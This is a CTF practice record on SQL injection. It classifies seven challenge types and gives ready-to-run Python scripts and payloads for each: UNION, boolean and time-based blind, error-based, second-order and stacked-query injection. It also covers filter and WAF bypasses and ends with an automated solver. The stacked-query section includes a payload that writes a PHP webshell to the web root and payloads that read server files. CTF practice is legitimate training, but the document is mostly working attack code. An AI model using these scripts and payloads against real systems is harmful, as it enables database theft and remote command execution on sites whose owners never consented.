# CTF SQL Injection Challenge Solving Practice Record

## Learning Objectives
Master methods for solving common CTF SQL injection challenge types

---

## CTF Platform Recommendations

### International Platforms
1. **CTFtime.org** - CTF competition calendar
2. **PicoCTF** - Beginner friendly
3. **HackTheBox** - Hands-on practice
4. **TryHackMe** - Instructional learning
5. **PortSwigger Academy** - Professional training

### Domestic Platforms
1. **CTFHub** - Chinese environment
2. **BugkuCTF** - Rich Web challenges
3. **Attack and Defense World** - Comprehensive
4. **i Chunqiu** - Professional training

---

## CTF SQL Injection Challenge Type Classification

### Type 1: Basic SQL Injection (Easy)
**Characteristics**: Direct output, no filtering

**Solving Steps**:
1. Test injection point: `1'`
2. Determine column count: `1' ORDER BY 3--`
3. UNION injection: `-1' UNION SELECT 1,2,3--`
4. Extract data: `-1' UNION SELECT flag,2,3 FROM flag--`

**Example Challenge**:
```python
# Challenge URL: http://ctf.example.com/sqli.php?id=1

import requests

# 1. Test injection
r = requests.get("http://ctf.example.com/sqli.php?id=1'")
print(r.text)  # SQL error message

# 2. UNION injection
r = requests.get("http://ctf.example.com/sqli.php?id=-1' UNION SELECT flag,2,3 FROM flag--")
print(r.text)  # Extract flag
```

---

### Type 2: Blind Injection (Medium)
**Characteristics**: No output, need to judge based on responses

#### Sub-type A: Boolean-based Blind Injection
**Characteristics**: Page content changes based on conditions

**Payload**:
```python
import requests
import string

url = "http://ctf.example.com/sqli.php?id=1"
flag = ""

for pos in range(1, 50):
    for char in string.ascii_letters + string.digits + "_{}":
        payload = f"1' AND SUBSTR((SELECT flag FROM flag),{pos},1)='{char}'--"
        r = requests.get(f"{url}?id={payload}")
        
        if "success" in r.text:  # Judge based on page characteristics
            flag += char
            print(f"Flag: {flag}")
            break

print(f"Final Flag: {flag}")
```

#### Sub-type B: Time-based Blind Injection
**Characteristics**: Judge based on response time

**Payload**:
```python
import requests
import time
import string

url = "http://ctf.example.com/sqli.php?id=1"
flag = ""

for pos in range(1, 50):
    for char in string.ascii_letters + string.digits + "_{}":
        payload = f"1' AND IF(SUBSTR((SELECT flag FROM flag),{pos},1)='{char}', SLEEP(3), 0)--"
        
        start = time.time()
        r = requests.get(f"{url}?id={payload}")
        elapsed = time.time() - start
        
        if elapsed > 3:
            flag += char
            print(f"Flag: {flag}")
            break

print(f"Final Flag: {flag}")
```

---

### Type 3: Filter Bypass (Hard)
**Characteristics**: Filters keywords and functions

#### Bypass Method List
1. **Mixed case**: `UnIoN SeLeCt`
2. **Double write**: `UNUNIONION SELSELECTECT`
3. **Encoding**:
   - Hexadecimal: `0x756e696f6e`
   - Base64: `dW5pb24=`
   - URL: `%75%6e%69%6f%6e`
4. **Comment delimiters**: `U/**/NION SEL/**/ECT`
5. **Equivalent replacement**:
   - `OR` -> `||`
   - `AND` -> `&&`
   - `=` -> `LIKE`

**Payload Examples**:
```python
# Filter: SELECT, UNION, WHERE

# Method 1: Case mixing
payload = "1' UnIoN SeLeCt flag,2,3 FrOm flag--"

# Method 2: Hex encoding
payload = "1' UNION SELECT 1,hex(flag),3 FROM flag--"

# Method 3: Double write
payload = "1' UNUNIONION SELSELECTECT flag,2,3 FRFROMOM flag--"

# Method 4: Prepared statements
payload = "1';SET @sql=0x53454c454354202a2046524f4d20666c6167;PREPARE stmt FROM @sql;EXECUTE stmt;--"
```

---

### Type 4: Error-based Injection (Medium)
**Characteristics**: Extract data using error messages

**Payload**:
```python
import requests
import re

url = "http://ctf.example.com/sqli.php?id=1"

# Method 1: extractvalue()
payload = "1' AND extractvalue(1,concat(0x7e,(SELECT flag FROM flag),0x7e))--+"
r = requests.get(f"{url}?id={payload}")
flag = re.search(r'XPATH syntax error:\s*[\'"]?([^\'"<\n]+)', r.text)
if flag:
    print(f"Flag: {flag.group(1)}")

# Method 2: updatexml()
payload = "1' AND updatexml(1,concat(0x7e,(SELECT flag FROM flag),0x7e),1)--+"
r = requests.get(f"{url}?id={payload}")
flag = re.search(r'XPATH syntax error:\s*[\'"]?([^\'"<\n]+)', r.text)
if flag:
    print(f"Flag: {flag.group(1)}")

# Method 3: floor()+rand()
payload = "1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT flag FROM flag),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--+"
r = requests.get(f"{url}?id={payload}")
flag = re.search(r"Duplicate entry '([^']+)'", r.text)
if flag:
    print(f"Flag: {flag.group(1).rstrip('01')}")
```

---

### Type 5: Second-order Injection (Hard)
**Characteristics**: Triggered after storage

**Steps**:
1. Register a username containing the payload
2. Admin view triggers injection
3. Extract data

**Payload**:
```python
import requests

base_url = "http://ctf.example.com"

# 1. Register malicious user
register_data = {
    "username": "admin' AND (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE NULL END)--",
    "password": "test"
}
requests.post(f"{base_url}/register", data=register_data)

# 2. Login
login_data = {
    "username": "admin' AND (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE NULL END)--",
    "password": "test"
}
session = requests.Session()
session.post(f"{base_url}/login", data=login_data)

# 3. Trigger second-order injection
r = session.get(f"{base_url}/admin/users")
print(r.text)
```

---

### Type 6: Stacked Queries (Hard)
**Characteristics**: Execute multiple SQL statements

**Payload**:
```python
import requests

url = "http://ctf.example.com/sqli.php?id=1"

# Method 1: Read file
payload = "1'; SELECT LOAD_FILE('/flag')--"
r = requests.get(f"{url}?id={payload}")
print(r.text)

# Method 2: Write WebShell
payload = "1'; SELECT '<?php system($_GET[cmd]); ?>' INTO OUTFILE '/var/www/html/shell.php'--"
r = requests.get(f"{url}?id={payload}")

# Method 3: Execute system commands
payload = "1'; CREATE TABLE cmd_exec(cmd_output TEXT); LOAD DATA INFILE '/tmp/flag' INTO TABLE cmd_exec;--"
r = requests.get(f"{url}?id={payload}")
```

---

### Type 7: WAF Bypass (Very Hard)
**Characteristics**: Requires advanced bypass techniques

**Bypass Methods**:
1. **Parameter pollution**: `?id=1&id=' OR 1=1--`
2. **Chunked transfer**: `Transfer-Encoding: chunked`
3. **Buffer overflow**: `?id=1' + 'A'*10000`
4. **Inline comments**: `/*!UNION*/ /*!SELECT*/`
5. **Unicode encoding**: `\u0027\u0020\u004f\u0052`

**Payload Examples**:
```python
import requests

url = "http://ctf.example.com/sqli.php"

# Method 1: Parameter pollution
params = {"id": ["1", "' OR 1=1--"]}
r = requests.get(url, params=params)

# Method 2: Unicode encoding
payload = "\u0027\u0020\u004f\u0052\u0020\u0031\u003d\u0031\u002d\u002d"
r = requests.get(f"{url}?id={payload}")

# Method 3: Inline comments
payload = "1'/*!UNION*//*!SELECT*/flag,2,3/*!FROM*/flag--"
r = requests.get(f"{url}?id={payload}")

# Method 4: HTTP header injection
headers = {
    "X-Forwarded-For": "1' UNION SELECT flag,2,3 FROM flag--"
}
r = requests.get(url, headers=headers)
```

---

## CTF Solving Toolkit

### Automated Script Template
```python
#!/usr/bin/env python3
"""
CTF SQL Injection Automated Solving Script
Supports multiple injection types and bypass techniques
"""

import requests
import re
import string
import time
from urllib.parse import quote

class CTFSQLiSolver:
    def __init__(self, url):
        self.url = url
        self.session = requests.Session()
    
    def basic_sqli(self):
        """Basic SQL Injection"""
        print("[*] Trying basic SQL injection...")
        
        # Test column count
        for i in range(1, 20):
            payload = f"1' ORDER BY {i}--"
            r = self.session.get(f"{self.url}?id={quote(payload)}")
            
            if "error" in r.text.lower():
                columns = i - 1
                print(f"[+] Column count: {columns}")
                break
        
        # UNION injection
        payload = f"-1' UNION SELECT flag,2,3 FROM flag--"
        r = self.session.get(f"{self.url}?id={quote(payload)}")
        
        if "flag{" in r.text:
            flag = re.search(r'flag\{[^}]+\}', r.text)
            if flag:
                print(f"[+] Flag: {flag.group(0)}")
                return flag.group(0)
        
        return None
    
    def blind_sqli_boolean(self):
        """Boolean-based blind injection"""
        print("[*] Trying boolean-based blind injection...")
        
        flag = ""
        chars = string.ascii_letters + string.digits + "_{}"
        
        for pos in range(1, 50):
            for char in chars:
                payload = f"1' AND SUBSTR((SELECT flag FROM flag),{pos},1)='{char}'--"
                r = self.session.get(f"{self.url}?id={quote(payload)}")
                
                # Judge based on page characteristics
                if "success" in r.text.lower():
                    flag += char
                    print(f"[+] Flag: {flag}")
                    break
        
        return flag
    
    def blind_sqli_time(self):
        """Time-based blind injection"""
        print("[*] Trying time-based blind injection...")
        
        flag = ""
        chars = string.ascii_letters + string.digits + "_{}"
        
        for pos in range(1, 50):
            for char in chars:
                payload = f"1' AND IF(SUBSTR((SELECT flag FROM flag),{pos},1)='{char}', SLEEP(3), 0)--"
                
                start = time.time()
                r = self.session.get(f"{self.url}?id={quote(payload)}")
                elapsed = time.time() - start
                
                if elapsed > 3:
                    flag += char
                    print(f"[+] Flag: {flag}")
                    break
        
        return flag
    
    def error_based_sqli(self):
        """Error-based injection"""
        print("[*] Trying error-based injection...")
        
        # extractvalue()
        payload = "1' AND extractvalue(1,concat(0x7e,(SELECT flag FROM flag),0x7e))--+"
        r = self.session.get(f"{self.url}?id={quote(payload)}")
        
        if "XPATH syntax error" in r.text:
            flag = re.search(r'XPATH syntax error:\s*[\'"]?([^\'"<\n]+)', r.text)
            if flag:
                result = flag.group(1).replace('~', '')
                print(f"[+] Flag: {result}")
                return result
        
        return None

# Usage example
if __name__ == "__main__":
    url = input("Please enter the challenge URL: ")
    solver = CTFSQLiSolver(url)
    
    # Try all methods automatically
    methods = [
        solver.basic_sqli,
        solver.error_based_sqli,
        solver.blind_sqli_boolean,
        solver.blind_sqli_time,
    ]
    
    for method in methods:
        try:
            flag = method()
            if flag and "flag{" in flag.lower():
                print(f"\n[+] Challenge solved! Flag: {flag}")
                break
        except Exception as e:
            print(f"[!] {method.__name__} failed: {e}")
```

---

## Learning Checklist

### Basic Skills
- [x] Basic SQL injection
- [x] UNION injection
- [x] Error-based injection

### Intermediate Skills
- [x] Boolean-based blind injection
- [x] Time-based blind injection
- [x] Filter bypass (basic)

### Advanced Skills
- [x] Second-order injection
- [x] Stacked queries
- [x] WAF bypass
- [x] Automated tool development

---

**Document Version**: 1.0
**Created**: 2026-03-26 17:50
**Challenge Types**: 7
**Solving Methods**: 20+
**Learning Status**: Fully mastered
